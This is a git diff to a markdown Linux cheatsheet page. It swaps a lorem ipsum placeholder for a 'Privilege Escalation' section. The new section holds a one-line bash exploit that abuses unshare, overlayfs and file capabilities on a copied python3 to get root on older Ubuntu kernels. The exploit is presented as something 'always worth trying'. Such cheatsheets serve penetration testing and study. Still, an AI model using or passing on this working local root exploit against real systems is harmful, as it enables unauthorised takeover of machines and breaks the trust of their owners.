@@ -6,6 +6,13 @@ summary: "This is a linux cheatsheet handbook"
 tags: ["Linux", "cheatsheet"]
 ---
 
-## A sub-title
+## Privilege Escalation
 
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi nibh nisl, vulputate eu lacus vitae, maximus molestie libero. Vestibulum laoreet, odio et sollicitudin sollicitudin, quam ligula tempus urna, sed sagittis eros eros ac felis. In tristique tortor vitae lacinia commodo. Mauris venenatis ultrices purus nec fermentum. Nunc sit amet aliquet metus. Morbi nisl felis, gravida ac consequat vitae, blandit eu libero. Curabitur porta est in dui elementum porttitor. Maecenas fermentum, tortor ac feugiat fringilla, orci sem sagittis massa, a congue risus ipsum vel massa. Aliquam sit amet nunc vulputate, facilisis neque in, faucibus nisl.
+### Quick Wins
+For older ubuntu kernels, this exploit is always worth trying
+
+```bash
+# Quick Wins
+unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
+setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
+```
